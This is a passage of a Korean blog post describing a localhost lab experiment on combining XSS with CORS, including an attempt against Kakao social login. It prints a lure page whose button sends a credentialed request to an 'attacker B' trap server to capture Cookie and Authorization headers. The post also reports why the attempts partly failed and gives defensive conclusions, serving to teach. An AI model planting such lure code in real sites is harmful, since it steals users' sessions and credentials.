                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Response</span><span class="dl">"</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">responseJson</span><span class="p">))</span>
              <span class="p">)</span>
              <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">error</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="nx">error</span><span class="p">));</span>
          <span class="p">}</span>

          <span class="nx">testPost</span><span class="p">();</span>
        <span class="nt">&lt;/script&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
  <span class="nt">&lt;/html&gt;</span>

  {{ end }}
</pre></table></code></div></div></ul></ul></ul><h2 id="공격자b의-hostname-변경-실험-결과">공격자B의 hostname 변경 실험 결과</h2><ul><li>공격 일부 실패<ul><li>Authorization 헤더는 받아왔지만, Cookie를 받는데에는 실패했다.<li>공격자B 서버 쉘 로그<ul><li><a href="/assets/img/2021-08-27-xss-cors-example/03-listen-trap-request-hostname-changed.jpg" target="_blank"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2021-08-27-xss-cors-example/03-listen-trap-request-hostname-changed.jpg" width="100%" /></a></ul></ul></ul><h2 id="실험변형-2-카카오-소셜로그인-서비스-공격">실험변형 2. 카카오 소셜로그인 서비스 공격</h2><ul><li>의문<ul><li>카카오 소셜로그인은 RestAPI 방식과 javascript 팝업 방식(이하 팝업 방식)으로 제공된다.<li>팝업 방식을 사용하면 카카오 인증정보가 쿠키로 저장된다.<li><a href="/assets/img/2021-08-27-xss-cors-example/04-kakao-auth-cookie.jpg" target="_blank"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2021-08-27-xss-cors-example/04-kakao-auth-cookie.jpg" width="100%" /></a><br /> 위에서 보이는 쿠키들을 그대로 복사한 뒤, 카카오 인증을 하지 않은 다른 브라우저에 입력하고<br /> 카카오 서비스에 접속해보면 로그인이 된다.<li>과연 이전 실험과 같은 방법으로 카카오 인증정보를 가져올 수 있을까?</ul><li>실험변형 개요<ul><li>게시글A에서 실험용 페이지 victim-community-kakao.html를 만든다.<li>victim-community-kakao.html에 카카오 로그인과 공격자B 서버로<br /> AJAX 요청을 하는 ‘공격 버튼’을 만든다.<li>사용자가 http://localhost:8888/victim/community/kakao 에 접속하여<br /> 카카오 로그인을 한 후 ‘공격 버튼’을 클릭한다.<li>공격자B 서버 bash shell을 관찰하여 endpoint trap에 요청이 들어왔는지 확인한다.<br /> 그리고 요청에 담긴 Cookie 헤더와 Authorization 헤더 값을 확인한다.</ul><li>주의사항<ul><li>팝업 방식으로 카카오 로그인 구현 시 카카오앱의 javascript key가 필요하다.<li><a href="https://developers.kakao.com/docs/latest/ko/kakaologin/js">카카오 개발자</a>로 이동하여 실험용 카카오앱을 만들고 javascript key를 발급받자.</ul><li>실험환경 수정<ul><li>게시판A 서버에서 victim-community-kakao.html를 만들고 라우터를 생성한다.<br /> (endpoint GET; victim/community/kakao로 라우터에 추가(<a href="https://github.com/a3magic3pocket/xxs-cors-example/blob/main/victim_server/main.go">참고</a>))<li>나머지 부분은 이전 실험과 동일하다<li>실행방법은 실험변경 개요에서 서술한 것과 같이 진행한다.<li>victim-community-kakao.html<ul><li><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre><td class="rouge-code"><pre>{{ define "victim-community-kakao.html" }}

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"ko"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">content=</span><span class="s">"yes"</span> <span class="na">name=</span><span class="s">"apple-mobile-web-app-capable"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;meta</span>
      <span class="na">content=</span><span class="s">"minimum-scale=1.0, width=device-width, maximum-scale=1, user-scalable=no"</span>
      <span class="na">name=</span><span class="s">"viewport"</span>
    <span class="nt">/&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://developers.kakao.com/sdk/js/kakao.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
  <span class="nt">&lt;/head&gt;</span>

  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div&gt;</span>로그인 상태: <span class="nt">&lt;span</span> <span class="na">id=</span><span class="s">"login-status"</span><span class="nt">&gt;</span>로그인 안 함<span class="nt">&lt;/span&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"login"</span><span class="nt">&gt;</span>카카오 로그인<span class="nt">&lt;/a&gt;</span>

    <span class="nt">&lt;div&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"display: block; margin-top: 100px"</span><span class="nt">&gt;</span>게시판 낚시 글<span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;button</span>
        <span class="na">onclick=</span><span class="s">"(function() {
        var xhr = new XMLHttpRequest();
        var url = 'http://127.0.0.1:8889/trap';

        xhr.open('POST', url, true);
        xhr.withCredentials = true
        xhr.onreadystatechange = function() {
          if (xhr.readyState === XMLHttpRequest.DONE) {
            var status = xhr.status;
            if (status === 0 || (status &gt;= 200 &amp;&amp; status &lt; 400)) {
              console.log('You are in my trap', xhr.responseText)
            } else {
              console.log('I failed to get you into my trap.', xhr.responseText)
            }
          }
        } 
        xhr.send()
      })()"</span>
      <span class="nt">&gt;</span>
        ☆★☆★누르면 놀라운 일이 벌어짐☆★☆★
      <span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/div&gt;</span>

    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
      <span class="kd">var</span> <span class="nx">loginStatusElem</span><span class="p">;</span>

      <span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">DOMContentLoaded</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="nx">loginStatusElem</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">#login-status</span><span class="dl">"</span><span class="p">);</span>

        <span class="c1">// 본인 소유의 카카오 javascript key 입력</span>
        <span class="nx">Kakao</span><span class="p">.</span><span class="nx">init</span><span class="p">(</span><span class="dl">"</span><span class="s2">your-kakao-app-javascript-key</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">Kakao</span><span class="p">.</span><span class="nx">isInitialized</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">Kakao</span><span class="p">.</span><span class="nx">isInitialized</span><span class="p">());</span>

        <span class="nx">Kakao</span><span class="p">.</span><span class="nx">Auth</span><span class="p">.</span><span class="nx">createLoginButton</span><span class="p">({</span>
          <span class="na">container</span><span class="p">:</span> <span class="dl">"</span><span class="s2">#login</span><span class="dl">"</span><span class="p">,</span>
          <span class="na">success</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">success</span><span class="dl">"</span><span class="p">,</span> <span class="nx">response</span><span class="p">);</span>
            <span class="nx">loginStatusElem</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">로그인 중</span><span class="dl">"</span><span class="p">;</span>
          <span class="p">},</span>
          <span class="na">fail</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">login is failed</span><span class="dl">"</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
            <span class="nx">loginStatusElem</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">로그인 실패</span><span class="dl">"</span><span class="p">;</span>
          <span class="p">},</span>
        <span class="p">});</span>
      <span class="p">});</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

{{ end }}
</pre></table></code></div></div></ul></ul></ul><h2 id="카카오-소셜로그인-서비스-공격-실험결과">카카오 소셜로그인 서비스 공격 실험결과</h2><ul><li>실패<ul><li>공격자B로 쿠키에 담긴 카카오 계정정보가 전송되지 않았다.<li><a href="/assets/img/2021-08-27-xss-cors-example/05-listen-trap-kakako-auth.jpg" target="_blank"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2021-08-27-xss-cors-example/05-listen-trap-kakako-auth.jpg" width="100%" /></a></ul><li>이유<ul><li>카카오 인증정보 쿠키를 보면 domain이 localhost가 아니다.<li><a href="/assets/img/2021-08-27-xss-cors-example/06-check-kakao-auth-cookie-domain.jpg" target="_blank"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2021-08-27-xss-cors-example/06-check-kakao-auth-cookie-domain.jpg" width="100%" /></a><li><a href="https://developer.mozilla.org/ko/docs/Web/Security/Same-origin_policy#%EA%B5%90%EC%B0%A8_%EC%B6%9C%EC%B2%98_%EB%8D%B0%EC%9D%B4%ED%84%B0_%EC%A0%80%EC%9E%A5%EC%86%8C_%EC%A0%91%EA%B7%BC">쿠키의 동일출처정책</a>에 의해 브라우저는<br /> 공격자B의 서버와 카카오 인증정보 쿠키를 할당한 서버가 다르다고 판명하고<br /> 공격자B로의 AJAX 요청에 카카오 인증정보를 보내지 않은 것이다.</ul></ul><h2 id="결론">결론</h2><ul><li>대부분의 웹 프레임워크는 기본적으로 escaping script를 하고 렌더한다.<ul><li>이 실험은 XSS가 성공했다고 가정하고 한 실험이다.<li>일반적으로 웹 프레임워크는 사용자에게 받은 데이터를 DB에 저장하고<br /> 이를 꺼내 뷰로 뿌리면 innerText로 지정되어 해당 내용이 그대로 렌더되지 않는다.<li>예를들면, <a href="https://a3magic3pocket.github.io/posts/apply-innerHTML-in-label-tag/">Label 태그에 개행(newLine) 넣기</a> 과 같이<br /> gotemplate 역시 escaping 처리되어 나오는 것을 알 수 있다.<li>하지만 DOM-based 방식 외의 다른 방법으로 XSS를 시도한다면 이 방법으로 막을 수 없다.</ul><li>Authorization Header보다 Cookie가 안전할지도?<ul><li>위 실험결과만 보면 HttpOnly 설정과 Secure 설정등의 옵션이 체크된 Cookie가<br /> Authorization Header보다 안전할 수도 있다고 생각이 들었다.<li>만약 게시판A에서 기본인증을 사용하여 Authorization Header로 인증을 구현하고 있었다면,<br /> 위 실험과 같은 방법으로 공격자B는 base64 문자열을 decode 하여<br /> 사용자의 ID, password를 확보할 수 있을 것이다.</ul></ul><h2 id="참고">참고</h2><ul><li><a href="https://developer.mozilla.org/ko/docs/Web/Security/Same-origin_policy#%EA%B5%90%EC%B0%A8_%EC%B6%9C%EC%B2%98_%EB%8D%B0%EC%9D%B4%ED%84%B0_%EC%A0%80%EC%9E%A5%EC%86%8C_%EC%A0%91%EA%B7%BC">쿠키의 동일출처정책</a><li><a href="https://developers.kakao.com/docs/latest/ko/kakaologin/js">카카오 개발자, 자바스크립트와 카카오 로그인</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web/'>Web</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/gonic-gin/" class="post-tag no-text-decoration" >gonic-gin</a> <a href="/tags/cors/" class="post-tag no-text-decoration" >cors</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=CORS를 이용한 XSS 공격 실험(카카오 로그인) - 의사줌치&url=https://a3magic3pocket.github.io/posts/xss-cors-example/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=CORS를 이용한 XSS 공격 실험(카카오 로그인) - 의사줌치&u=https://a3magic3pocket.github.io/posts/xss-cors-example/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=CORS를 이용한 XSS 공격 실험(카카오 로그인) - 의사줌치&url=https://a3magic3pocket.github.io/posts/xss-cors-example/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/kafka-large-scale-event-processing-architecture-and-performance-comparison/">Kafka를 활용한 대용량 이벤트 처리 구조 설계와 성능 비교</a><li><a href="/posts/experimenting-with-blue-green-deployments/">블루 - 그린 배포 실험</a><li><a href="/posts/spring-kafka-latest-message-pub-sub-config/">Spring Kafka에서 최신 메시지만 소비하는 Pub/Sub 방식 설정</a><li><a href="/posts/solving-concurrency-problems-with-performance-in-mind/">동시성 문제 해결 방안 성능 실험</a><li><a href="/posts/exploring-authentication-options/">인증방식 고민</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/kafka/">kafka</a> <a class="post-tag" href="/tags/kotlin/">kotlin</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/elk/">elk</a> <a class="post-tag" href="/tags/spring/">spring</a> <a class="post-tag" href="/tags/summary/">summary</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/kafka-streams/">kafka-streams</a> <a class="post-tag" href="/tags/nest/">nest</a> <a class="post-tag" href="/tags/react/">react</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/cors/"><div class="card-body"> <span class="timeago small" > Aug 24, 2021 <i class="unloaded">2021-08-24T18:24:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>gonic-gin CORS 처리</h3><div class="text-muted small"><p> 개요 cors에 대해서 자세히 알아본다. gin web framework 사용 시 cors 처리 예시를 작성해본다. CORS 란(참고) 정의 CORS(Cross-Origin Resource Sharing, CORS)는 추가적인 HTTP 헤더를 사용하여, 다른 출처의 선택한 자원에 접근할 수 있도록 브라우저에게 알려...</p></div></div></a></div><div class="card"> <a href="/posts/prevent-browser-cache/"><div class="card-body"> <span class="timeago small" > May 13, 2021 <i class="unloaded">2021-05-13T15:49:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>브라우저 캐시 막기</h3><div class="text-muted small"><p> 개요 사용자가 브라우저에서 뒤로가기 입력 시 브라우저 캐시가 로드되어 곤란할 때가 있다. http header의 값을 변경하여 브라우저가 해당 페이지를 캐싱하지 않도록 할 수 있다. 캐싱 막기 웹 서버가 해당 페이지를 로드할 때, 아래와 같은 헤더를 추가한다. Cache-Control: no-cache, no-store, mu...</p></div></div></a></div><div class="card"> <a href="/posts/where-you-save-auth-in-client/"><div class="card-body"> <span class="timeago small" > Aug 30, 2021 <i class="unloaded">2021-08-30T15:31:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>React 사용 시 JWT를 어디에 저장해야할까?</h3><div class="text-muted small"><p> 개요 예전에 React를 처음 사용할 때 backend를 jwt 인증방식으로 구현한 뒤 frontend에서는 이 jwt를 어디에 저장할지 고민했었다. 그때 4장. JWT 이해 및 적용를 보고 쿠키에 httpOnly 설정으로 저장하는 방법을 사용하기로 결정했다. 당시는 따라하는데 급급하여 무작정 똑같이 하였는데, 이번에 gonic-gin C...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/cors/" class="btn btn-outline-primary" prompt="Older"><p>gonic-gin CORS 처리</p></a> <a href="/posts/where-you-save-auth-in-client/" class="btn btn-outline-primary" prompt="Newer"><p>React 사용 시 JWT를 어디에 저장해야할까?</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/a3magic3pocket">의사줌치</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/kafka/">kafka</a> <a class="post-tag" href="/tags/kotlin/">kotlin</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/elk/">elk</a> <a class="post-tag" href="/tags/spring/">spring</a> <a class="post-tag" href="/tags/summary/">summary</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/kafka-streams/">kafka streams</a> <a class="post-tag" href="/tags/nest/">nest</a> <a class="post-tag" href="/tags/react/">react</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://a3magic3pocket.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
